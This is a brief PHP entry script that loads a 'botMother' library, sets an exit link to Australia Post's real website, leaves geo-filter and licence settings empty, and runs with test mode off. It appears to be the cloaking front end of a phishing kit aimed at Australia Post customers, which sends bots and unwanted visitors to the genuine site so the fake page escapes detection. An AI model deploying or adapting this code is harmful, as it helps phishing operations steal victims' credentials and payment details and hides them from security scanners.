<?php 
require (__DIR__).'/config.php';
require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$bm->setExitLink("https://auspost.com.au/");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);
$bm->run();
 

?>